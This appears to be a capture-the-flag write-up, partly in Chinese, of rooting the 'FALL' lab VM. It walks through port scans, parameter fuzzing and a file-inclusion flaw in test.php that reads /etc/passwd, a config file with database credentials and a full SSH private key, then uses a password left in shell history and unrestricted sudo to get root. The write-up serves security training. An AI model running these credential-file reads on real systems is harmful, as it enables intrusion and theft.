## port scan

```shell
# Nmap 7.94SVN scan initiated Tue Feb  4 04:42:02 2025 as: nmap -sT --min-rate=10000 -p- -oN nmap_result/port 192.168.28.22
Nmap scan report for 192.168.28.22 (192.168.28.22)
Host is up (0.0027s latency).
Not shown: 65503 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn
443/tcp   open   https
445/tcp   open   microsoft-ds
3306/tcp  open   mysql
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   zeus-admin
10080/tcp closed amanda
10443/tcp closed cirrossp
```

```shell
# Nmap 7.94SVN scan initiated Tue Feb  4 04:43:05 2025 as: nmap -sT -sVC -O -p22,80,139,443,445,3306,9090 -oN nmap_result/detils 192.168.28.22
Nmap scan report for 192.168.28.22
Host is up (0.0039s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
|_  256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
80/tcp   open  http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp  open  ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2019-08-15T03:51:33
|_Not valid after:  2020-08-19T05:31:33
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
445/tcp  open  netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
9090/tcp open  http        Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://192.168.28.22:9090/
MAC Address: 00:0C:29:F5:72:7C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28
Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (95%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Linux 5.1 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   NetBIOS computer name: FALL\x00
|   Workgroup: SAMBA\x00
|_  System time: 2025-02-04T01:43:36-08:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 8h00m01s
```

## web

```shell
# Dirsearch started Tue Feb  4 05:30:55 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.28.22/

301   235B   http://192.168.28.22/admin    -> REDIRECTS TO: http://192.168.28.22/admin/
302     0B   http://192.168.28.22/admin/    -> REDIRECTS TO: http://192.168.28.22/admin/login.php
302     0B   http://192.168.28.22/admin/index.php    -> REDIRECTS TO: http://192.168.28.22/admin/login.php
200     4KB  http://192.168.28.22/admin/login.php
301   236B   http://192.168.28.22/assets    -> REDIRECTS TO: http://192.168.28.22/assets/
200     2KB  http://192.168.28.22/assets/
404    16B   http://192.168.28.22/composer.phar
200     0B   http://192.168.28.22/config.php
200    24B   http://192.168.28.22/doc/
301   233B   http://192.168.28.22/doc    -> REDIRECTS TO: http://192.168.28.22/doc/
200    80B   http://192.168.28.22/error.html
200     1KB  http://192.168.28.22/favicon.ico
404   231B   http://192.168.28.22/index.php/login/
301   233B   http://192.168.28.22/lib    -> REDIRECTS TO: http://192.168.28.22/lib/
200    24B   http://192.168.28.22/lib/
301   237B   http://192.168.28.22/modules    -> REDIRECTS TO: http://192.168.28.22/modules/
200     3KB  http://192.168.28.22/modules/
404    16B   http://192.168.28.22/php-cs-fixer.phar
200    17B   http://192.168.28.22/phpinfo.php
404    16B   http://192.168.28.22/phpunit.phar
200    79B   http://192.168.28.22/robots.txt
200    80B   http://192.168.28.22/test.php
301   233B   http://192.168.28.22/tmp    -> REDIRECTS TO: http://192.168.28.22/tmp/
200     1KB  http://192.168.28.22/tmp/
200     0B   http://192.168.28.22/uploads/
301   237B   http://192.168.28.22/uploads    -> REDIRECTS TO: http://192.168.28.22/uploads/
```

`test.php`

```shell
└─$ curl http://192.168.28.22/test.php                                                                    
<html>
<body>
<script>alert('Missing GET parameter!');</script>
</body>
</html>
```

提示：缺少GET参数

fuzz参数

`/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`

![image-20250204210318226](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210318226.png)

参数为：file

继续fuzz，（系统文件）

![image-20250204210521815](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210521815.png)

```
wfuzz  -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 80 --hc 404 http://192.168.28.22/test.php?FUZZ=1
```

![image-20250204210856631](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204210856631.png)

`/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
...
...
qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
```

```
http://192.168.28.22/test.php?file=php://filter/convert.base64-encode/resource=config.php
```

```php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Asia/Singapore';
$config['db_port'] = 3306;
?>
```

数据库账密：`cms_user:P@ssw0rdINSANITY`

尝试包含ssh私钥

```
http://192.168.28.22/test.php?file=/home/qiu/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0
FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX
61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien
qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d
Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS
vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO
NY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge
d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW
iRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka
U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl
KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G
NWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs
qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB
8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d
X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk
CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic
ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz
lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ
58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0
acm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329
JW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+
Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL
RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8
uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
-----END OPENSSH PRIVATE KEY-----
```

## 提权

ssh连接

```
ssh qiu@192.168.28.22 -i id_rsa
```

查看`.bash_history`

```
[qiu@FALL ~]$ cat .bash_history 
ls -al
cat .bash_history 
rm .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
```

`remarkablyawesomE`可能是一个密码

经过尝试发现是qiu的密码

```shell
[qiu@FALL ~]$ sudo -l
[sudo] password for qiu: 
Matching Defaults entries for qiu on FALL:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on FALL:
    (ALL) ALL
```

```shell
[qiu@FALL ~]$ sudo su
[root@FALL qiu]# cd
[root@FALL ~]# ls
anaconda-ks.cfg  original-ks.cfg  proof.txt  remarks.txt
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
```

